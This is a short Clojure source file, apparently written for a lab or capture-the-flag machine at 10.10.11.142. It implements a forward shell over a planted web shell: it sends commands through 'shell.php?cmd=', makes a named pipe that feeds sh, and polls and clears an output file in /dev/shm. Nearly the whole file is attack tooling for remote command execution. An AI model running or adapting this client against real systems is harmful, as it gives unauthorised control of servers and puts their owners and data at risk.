(ns core
  (:require
    [clojure.string :as str]
    [clojure.java.io :as io]
    [clj-http.client :as client]
    [taoensso.timbre :as timbre]
    [clojure.tools.cli :refer [parse-opts]]) 
  (:gen-class))

(def status (atom {:running true}))
(def url "http://10.10.11.142/shell.php?cmd=")

(defn send-command [cmd]
  (let [response (client/get (str url cmd))]
    (:body response)))


(defn get-output []
  (while (:running @status)
    (let [result (send-command "cat /dev/shm/output.0")]
      (when (< 0 (count result))
        (timbre/info result)
        (send-command "echo -n '' > /dev/shm/output.0"))
      (Thread/sleep 1200))))

(defn set-up []
  (send-command "mkfifo input.0;tail -f /dev/shm/input.0|sh > output.0 2>&1"))

(defn -main [& args] 
  ())
